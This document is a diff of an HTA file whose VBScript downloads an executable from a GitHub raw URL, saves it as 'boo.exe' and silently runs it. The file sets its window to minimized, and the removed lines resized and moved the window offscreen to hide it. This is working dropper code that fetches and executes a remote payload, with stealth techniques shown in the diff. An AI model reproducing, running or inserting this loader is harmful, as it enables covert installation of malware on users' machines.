@@ -12,30 +12,20 @@
       SCROLL="no"
       WINDOWSTATE="minimize"
     >
-    <style>
-      body {
-        background-color: transparent;
-        margin: 0;
-        overflow: hidden;
-      }
-    </style>
   </head>
   <body>
     <script language="VBScript">
-      ' Move and resize window offscreen to hide it completely
-      window.resizeTo 1, 1
-      window.moveTo -1000, -1000
-
       Option Explicit
 
       Dim http, stream, fso, shell
       Dim url, savePath
 
       url = "https://github.com/Nuthoul/ergetbnerbepkwnef/raw/refs/heads/main/hellworld.exe"
-      savePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\boo.exe"
+      savePath = "C:\Users\Nuthoul-\Downloads\boo.exe"
 
       On Error Resume Next
 
+      ' Use ServerXMLHTTP for better reliability
       Set http = CreateObject("MSXML2.ServerXMLHTTP")
       http.Open "GET", url, False
       http.Send
@@ -52,6 +42,7 @@
 
           If fso.FileExists(savePath) Then
               If fso.GetFile(savePath).Size > 0 Then
+                  ' Run the exe
                   Set shell = CreateObject("WScript.Shell")
                   shell.Run Chr(34) & savePath & Chr(34), 1, False
               Else
